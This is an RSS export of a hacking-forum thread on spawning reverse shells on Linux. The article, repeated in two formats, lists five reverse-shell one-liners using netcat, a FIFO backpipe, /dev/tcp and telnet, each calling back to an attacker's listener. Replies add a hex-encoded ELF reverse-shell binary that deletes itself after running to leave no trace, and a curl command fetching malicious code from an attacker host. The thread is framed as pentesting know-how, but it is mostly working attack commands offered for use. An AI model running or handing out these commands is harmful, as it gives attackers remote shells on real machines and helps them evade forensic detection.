<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Spawning reverse shells</title>
    <link>https://0x00sec.org/t/spawning-reverse-shells/2133</link>
    <description># Preface

This will be a short article which will demonstrates how to spawn an interactive reverse shell using built-in tools on any Linux distribution.  
Also, it shows what mindset and what kind of creativity might be needed when being a hacker or pen tester.


## But why?
There are many distributions of Linux and they all do things a little different in regard to built-in tools and/or security mechanisms. 
The following examples **should** be available no matter which OS is in front of you.  


## Test scenario

 * being able to run a simple command, or
 * cause a user to run a simple command on the target system



# Examples

In the following examples there will always be a notion like A and T, which
will resemble **A**ttacker and **T**arget to show where to run the commands.  

## 1. netcat

    nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash 	# T
	nc -n -vv -l -p &lt;port&gt;					# A

In current versions of netcat the -e flag probably won&#39;t be available
anymore, but if it is this makes life really easy.


## 2. netcat with -e disabled
One could just move on to other tools or means now since the -e flag
is not available anymore, but hey let&#39;s make things look really complicated
and hacker-like ;)

    mknod backpipe p; nc &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe    # T
	nc -n -vv -l -p &lt;port&gt;	# A

![netcat_no_e|690x381](upload://UUtaYFQ89qFISfkPtiVbMByXdP.png) 

### What does this do?  
We create a FIFO file system object and use it as a backpipe to relay standard output from the commands piped from netcat to /bin/bash back to nc.


## 3. netcat without netcat

    /bin/bash -i &gt; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&lt;&amp;1 2&gt;&amp;1      # T
    nc -n -vv -l -p &lt;port&gt; 	# A

![netcat_no_netcat|690x410](upload://vW11VUASnoLaim6bMEVGrXTOUfS.png) 

### What does this do?  
It takes the /dev/tcp socket programming feature and uses it to redirect /bin/bash to a remote system.



## 4. netcat without netcat or /dev/tcp

	mknod backpipe p; telnet &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe	    # T
	nc -n -vv -l -p &lt;port&gt; 	# A

![netcat_no_netcat_no_dev_tcp|690x393](upload://f6MbIxeaXM8KS0YCzsu5aALauiB.png) 


### What does this do?
This should be clear by now. We just use telnet instead of netcat with the examples shown in 2nd example above.



## 5. telnet to telnet

	telnet &lt;attacker_ip&gt; &lt;1st_port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;2nd_port&gt;     # T
	nc -n -vv -l -p &lt;1st_port&gt; 	# A1
	nc -n -vv -l -p &lt;2nd_port&gt;	# A2

![](upload://kwgtZqbv7KtyfjfGxhewGpYrvr1.png) 

### What does this do?
This is kinda weird, but it works :D .
It uses two telnet sessions connected to remote listeners to pipe input from one telnet session to /bin/bash and pipe the output to the second telnet session.


## 6. What&#39;s next?
This is up to you guys! 
What creative ways of spawning a reverse shell do you know or can find?
Let me know and let&#39;s complete this little list.  


# Peroration
I hope this little article was somewhat fun to read and showed you one thing.
Be creative. If something is not available on the system you work on, find another way. A way nobody would expect you to find or use.


___
Peace out</description>
    
    <lastBuildDate>Mon, 06 Jul 2020 19:38:25 +0000</lastBuildDate>
    <category>Linux</category>
    <atom:link href="https://0x00sec.org/t/spawning-reverse-shells/2133.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Spawning reverse shells</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/spawning-reverse-shells/2133/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/spawning-reverse-shells/2133/13</link>
        <pubDate>Mon, 06 Jul 2020 19:38:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2133-13</guid>
        <source url="https://0x00sec.org/t/spawning-reverse-shells/2133.rss">Spawning reverse shells</source>
      </item>
      <item>
        <title>Spawning reverse shells</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/spawning-reverse-shells/2133/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/spawning-reverse-shells/2133/12</link>
        <pubDate>Sun, 21 Jan 2018 00:36:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2133-12</guid>
        <source url="https://0x00sec.org/t/spawning-reverse-shells/2133.rss">Spawning reverse shells</source>
      </item>
      <item>
        <title>Spawning reverse shells</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <p>Since this topic of “stealthy reverse shell” got a lot of attention <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> created a new article to clarify the possibilites what is possible and must be considered to prevent disk writings when attempting a reverse shell.<br>
Much kudos to him. Show his article some love, but not more than mine. Pls <img src="https://0x00sec.org/images/emoji/twitter/confused.png?v=9" title=":confused:" class="emoji" alt=":confused:"></p>
<p><strong><a href="https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166/5">CLICK ME HARD</a></strong></p>
          <p><a href="https://0x00sec.org/t/spawning-reverse-shells/2133/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/spawning-reverse-shells/2133/11</link>
        <pubDate>Fri, 02 Jun 2017 18:09:06 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2133-11</guid>
        <source url="https://0x00sec.org/t/spawning-reverse-shells/2133.rss">Spawning reverse shells</source>
      </item>
      <item>
        <title>Spawning reverse shells</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>By the way, this article is really handy.</p>
          <p><a href="https://0x00sec.org/t/spawning-reverse-shells/2133/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/spawning-reverse-shells/2133/10</link>
        <pubDate>Fri, 02 Jun 2017 06:58:11 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2133-10</guid>
        <source url="https://0x00sec.org/t/spawning-reverse-shells/2133.rss">Spawning reverse shells</source>
      </item>
      <item>
        <title>Spawning reverse shells</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a>  As far as I know ,at least UNIX kernels expect binary executable files to be stored on the disk.<br>
This seems to be a requirement so the system can perform seek operations to arbitrary offsets, and also map the file contents into memory.<br>
Executing a binary or binary stream from standard input seems quite difficult/impossible.</p>
<p>Welp on the other side theres a defcon paper called <a href="https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf">PowerPwning: Post-Exploiting By<br>
Overpowering PowerShell</a> which kinda deals with this “not (re-)writing to disk when scripts are run.”</p>
          <p><a href="https://0x00sec.org/t/spawning-reverse-shells/2133/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/spawning-reverse-shells/2133/9</link>
        <pubDate>Fri, 02 Jun 2017 06:37:56 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2133-9</guid>
        <source url="https://0x00sec.org/t/spawning-reverse-shells/2133.rss">Spawning reverse shells</source>
      </item>
      <item>
        <title>Spawning reverse shells</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>I was messing around with <a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a> on IRC, exploring the possibilities of running binary in the shell. You can already compile C code to stdout.</p>
<pre><code class="lang-auto">curl - s https://attacker/malicious-code.c | gcc -o /dev/stdout -x c -
</code></pre>
<p>We tried things like <code>./-</code>, but it seems pretty difficult to execute code, without writing to the disk. In fact, it seems impossible. If we could find a good way to execute binary in the shell without writing to disk, we would have something that would be super useful for things like this.</p>
          <p><a href="https://0x00sec.org/t/spawning-reverse-shells/2133/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/spawning-reverse-shells/2133/8</link>
        <pubDate>Fri, 02 Jun 2017 06:30:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2133-8</guid>
        <source url="https://0x00sec.org/t/spawning-reverse-shells/2133.rss">Spawning reverse shells</source>
      </item>
      <item>
        <title>Spawning reverse shells</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/anon79434934">@anon79434934</a> covfefe mate</p>
          <p><a href="https://0x00sec.org/t/spawning-reverse-shells/2133/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/spawning-reverse-shells/2133/7</link>
        <pubDate>Wed, 31 May 2017 19:49:31 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2133-7</guid>
        <source url="https://0x00sec.org/t/spawning-reverse-shells/2133.rss">Spawning reverse shells</source>
      </item>
      <item>
        <title>Spawning reverse shells</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Actually you can easily get it:</p>
<p><code>cat /proc/PID/exe &gt; binary</code></p>
<p>The problem is that in order to get the remote shell you need to first run some code. If the access to the target machine was through a remote exploit then what you propose is the right way to go. If you have got just, telnet access, for instance… I do no know how to move something into memory without running some tool to allow that</p>
          <p><a href="https://0x00sec.org/t/spawning-reverse-shells/2133/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/spawning-reverse-shells/2133/6</link>
        <pubDate>Wed, 31 May 2017 19:34:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2133-6</guid>
        <source url="https://0x00sec.org/t/spawning-reverse-shells/2133.rss">Spawning reverse shells</source>
      </item>
      <item>
        <title>Spawning reverse shells</title>
        <dc:creator><![CDATA[anon79434934]]></dc:creator>
        <description><![CDATA[
            <p>Chuck Norris is a dead meme, normie.</p>
<p>on-topic: good article as always. bookmarked it for later reference.</p>
          <p><a href="https://0x00sec.org/t/spawning-reverse-shells/2133/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/spawning-reverse-shells/2133/5</link>
        <pubDate>Wed, 31 May 2017 19:31:22 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2133-5</guid>
        <source url="https://0x00sec.org/t/spawning-reverse-shells/2133.rss">Spawning reverse shells</source>
      </item>
      <item>
        <title>Spawning reverse shells</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="0x00pf" data-post="2" data-topic="2133">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar"> 0x00pf:</div>
<blockquote>
<p>Note that the binary is executed in the background and immediately deleted, so no track is left in the hard drive…</p>
</blockquote>
</aside>
<p>Wouldn’t the data still exist such that it could potentially be extracted using some forensics magics? Maybe it’d be better to allocate it some memory in a suspended process, then copied into the allocated memory and executed? This way, it never actually touches the disk.</p>
          <p><a href="https://0x00sec.org/t/spawning-reverse-shells/2133/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/spawning-reverse-shells/2133/4</link>
        <pubDate>Wed, 31 May 2017 19:24:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2133-4</guid>
        <source url="https://0x00sec.org/t/spawning-reverse-shells/2133.rss">Spawning reverse shells</source>
      </item>
      <item>
        <title>Spawning reverse shells</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> thanks and awesome continuation of the list! Love that approach!</p>
<p>I’m curious if we will see more fun approaches to this.</p>
          <p><a href="https://0x00sec.org/t/spawning-reverse-shells/2133/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/spawning-reverse-shells/2133/3</link>
        <pubDate>Wed, 31 May 2017 18:48:02 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2133-3</guid>
        <source url="https://0x00sec.org/t/spawning-reverse-shells/2133.rss">Spawning reverse shells</source>
      </item>
      <item>
        <title>Spawning reverse shells</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Nice post <a class="mention" href="https://0x00sec.org/u/ricksanchez">@ricksanchez</a> !<br>
This is my proposal for section 6 (What’s next)</p>
<p><span class="hashtag">#6</span>. Chuck Norris’ way<br>
Chuck Norris is not a hacker but he pwns any computer just walking close to it</p>
<ul>
<li>Chuck Norris writes his own reverse shells directly in machine code and types it in hex by heart</li>
<li>Chuck Norris writes IPs and Ports in network order and patches the hex values just staring at the binary dump.</li>
<li>Chuck Norris deletes his footprints as he goes. Actually he can go without leaving any footprint at all.</li>
</ul>
<pre><code class="lang-auto">nc -v -l 1337             # Attacker
echo -e "\x7F\x45\x4C\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x60\x80\x04\x08\x34\x00\x00\x00\xBC\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00\x28\x00\x03\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\xAA\x00\x00\x00\xAA\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6A\x66\x58\x6A\x01\x5B\x31\xD2\x52\x53\x6A\x02\x89\xE1\xCD\x80\x92\xB0\x66\x68\x7F\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xE1\x6A\x10\x51\x52\x89\xE1\x43\xCD\x80\x6A\x02\x59\x87\xDA\xB0\x3F\xCD\x80\x49\x79\xF9\xB0\x0B\x41\x89\xCA\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80\x00\x2E\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2E\x74\x65\x78\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0B\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x60\x80\x04\x08\x60\x00\x00\x00\x4A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xAA\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" &gt; c; chmod +x c;./c &amp; rm c  # Target
</code></pre>
<p>[details=Customize] &gt; Code above connects to 127.0.0.1 1337 from an i386 machine. If you want to change the IP look for <code>\x7F\x01\x01\x01</code> and if you want to change the port… well you better figure it out <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">.</p>
<blockquote>
<p>Note that the binary is executed in the background and immediately deleted, so no track is left in the hard drive…</p>
</blockquote>
<p>[/details]</p>
<h3>What does this do?</h3>
<p><sup>Actually, Chuck Norris has read the 0x00sec paper <a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966" class="inline-onebox">IoT Malware Droppers (Mirai and Hajime)</a></sup></p>
          <p><a href="https://0x00sec.org/t/spawning-reverse-shells/2133/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/spawning-reverse-shells/2133/2</link>
        <pubDate>Wed, 31 May 2017 18:23:11 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2133-2</guid>
        <source url="https://0x00sec.org/t/spawning-reverse-shells/2133.rss">Spawning reverse shells</source>
      </item>
      <item>
        <title>Spawning reverse shells</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <h1>Preface</h1>
<p>This will be a short article which will demonstrates how to spawn an interactive reverse shell using built-in tools on any Linux distribution.<br>
Also, it shows what mindset and what kind of creativity might be needed when being a hacker or pen tester.</p>
<h2>But why?</h2>
<p>There are many distributions of Linux and they all do things a little different in regard to built-in tools and/or security mechanisms.<br>
The following examples <strong>should</strong> be available no matter which OS is in front of you.</p>
<h2>Test scenario</h2>
<ul>
<li>being able to run a simple command, or</li>
<li>cause a user to run a simple command on the target system</li>
</ul>
<h1>Examples</h1>
<p>In the following examples there will always be a notion like A and T, which<br>
will resemble <strong>A</strong>ttacker and <strong>T</strong>arget to show where to run the commands.</p>
<h2>1. netcat</h2>
<pre><code>nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash 	# T
nc -n -vv -l -p &lt;port&gt;					# A
</code></pre>
<p>In current versions of netcat the -e flag probably won’t be available<br>
anymore, but if it is this makes life really easy.</p>
<h2>2. netcat with -e disabled</h2>
<p>One could just move on to other tools or means now since the -e flag<br>
is not available anymore, but hey let’s make things look really complicated<br>
and hacker-like <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
<pre><code>mknod backpipe p; nc &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe    # T
nc -n -vv -l -p &lt;port&gt;	# A
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/0/066ee6d52a1f8fe57f771626018f81bb320fecc5.png" data-download-href="/uploads/short-url/UUtaYFQ89qFISfkPtiVbMByXdP.png?dl=1" title="netcat_no_e"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/0/066ee6d52a1f8fe57f771626018f81bb320fecc5_2_690x381.png" alt="netcat_no_e" data-base62-sha1="UUtaYFQ89qFISfkPtiVbMByXdP" width="690" height="381" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/0/066ee6d52a1f8fe57f771626018f81bb320fecc5_2_690x381.png, /uploads/default/original/2X/0/066ee6d52a1f8fe57f771626018f81bb320fecc5.png 1.5x, /uploads/default/original/2X/0/066ee6d52a1f8fe57f771626018f81bb320fecc5.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/0/066ee6d52a1f8fe57f771626018f81bb320fecc5_2_10x10.png"></a></div><p></p>
<h3>What does this do?</h3>
<p>We create a FIFO file system object and use it as a backpipe to relay standard output from the commands piped from netcat to /bin/bash back to nc.</p>
<h2>3. netcat without netcat</h2>
<pre><code>/bin/bash -i &gt; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&lt;&amp;1 2&gt;&amp;1      # T
nc -n -vv -l -p &lt;port&gt; 	# A
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/d/dfd24b8f107cb13800b9dc6cac13572f74b033f8.png" data-download-href="/uploads/short-url/vW11VUASnoLaim6bMEVGrXTOUfS.png?dl=1" title="netcat_no_netcat"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dfd24b8f107cb13800b9dc6cac13572f74b033f8_2_690x410.png" alt="netcat_no_netcat" data-base62-sha1="vW11VUASnoLaim6bMEVGrXTOUfS" width="690" height="410" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dfd24b8f107cb13800b9dc6cac13572f74b033f8_2_690x410.png, /uploads/default/original/2X/d/dfd24b8f107cb13800b9dc6cac13572f74b033f8.png 1.5x, /uploads/default/original/2X/d/dfd24b8f107cb13800b9dc6cac13572f74b033f8.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dfd24b8f107cb13800b9dc6cac13572f74b033f8_2_10x10.png"></a></div><p></p>
<h3>What does this do?</h3>
<p>It takes the /dev/tcp socket programming feature and uses it to redirect /bin/bash to a remote system.</p>
<h2>4. netcat without netcat or /dev/tcp</h2>
<pre><code>mknod backpipe p; telnet &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe	    # T
nc -n -vv -l -p &lt;port&gt; 	# A
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/6/69e4bb383f6cca02e9b395a9f3fb3314351fcd19.png" data-download-href="/uploads/short-url/f6MbIxeaXM8KS0YCzsu5aALauiB.png?dl=1" title="netcat_no_netcat_no_dev_tcp"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/6/69e4bb383f6cca02e9b395a9f3fb3314351fcd19_2_690x393.png" alt="netcat_no_netcat_no_dev_tcp" data-base62-sha1="f6MbIxeaXM8KS0YCzsu5aALauiB" width="690" height="393" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/6/69e4bb383f6cca02e9b395a9f3fb3314351fcd19_2_690x393.png, /uploads/default/original/2X/6/69e4bb383f6cca02e9b395a9f3fb3314351fcd19.png 1.5x, /uploads/default/original/2X/6/69e4bb383f6cca02e9b395a9f3fb3314351fcd19.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/69e4bb383f6cca02e9b395a9f3fb3314351fcd19_2_10x10.png"></a></div><p></p>
<h3>What does this do?</h3>
<p>This should be clear by now. We just use telnet instead of netcat with the examples shown in 2nd example above.</p>
<h2>5. telnet to telnet</h2>
<pre><code>telnet &lt;attacker_ip&gt; &lt;1st_port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;2nd_port&gt;     # T
nc -n -vv -l -p &lt;1st_port&gt; 	# A1
nc -n -vv -l -p &lt;2nd_port&gt;	# A2
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/8/8fd132c88e30f05ce1f7558f2f85be75b6b7e74f.png" data-download-href="/uploads/short-url/kwgtZqbv7KtyfjfGxhewGpYrvr1.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8fd132c88e30f05ce1f7558f2f85be75b6b7e74f_2_560x500.png" alt="" data-base62-sha1="kwgtZqbv7KtyfjfGxhewGpYrvr1" width="560" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8fd132c88e30f05ce1f7558f2f85be75b6b7e74f_2_560x500.png, https://0x00sec.s3.amazonaws.com/optimized/2X/8/8fd132c88e30f05ce1f7558f2f85be75b6b7e74f_2_840x750.png 1.5x, /uploads/default/original/2X/8/8fd132c88e30f05ce1f7558f2f85be75b6b7e74f.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8fd132c88e30f05ce1f7558f2f85be75b6b7e74f_2_10x10.png"></a></div><p></p>
<h3>What does this do?</h3>
<p>This is kinda weird, but it works <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"> .<br>
It uses two telnet sessions connected to remote listeners to pipe input from one telnet session to /bin/bash and pipe the output to the second telnet session.</p>
<h2>6. What’s next?</h2>
<p>This is up to you guys!<br>
What creative ways of spawning a reverse shell do you know or can find?<br>
Let me know and let’s complete this little list.</p>
<h1>Peroration</h1>
<p>I hope this little article was somewhat fun to read and showed you one thing.<br>
Be creative. If something is not available on the system you work on, find another way. A way nobody would expect you to find or use.</p>
<hr>
<p>Peace out</p>
          <p><a href="https://0x00sec.org/t/spawning-reverse-shells/2133/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/spawning-reverse-shells/2133/1</link>
        <pubDate>Wed, 31 May 2017 08:22:49 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2133-1</guid>
        <source url="https://0x00sec.org/t/spawning-reverse-shells/2133.rss">Spawning reverse shells</source>
      </item>
  </channel>
</rss>
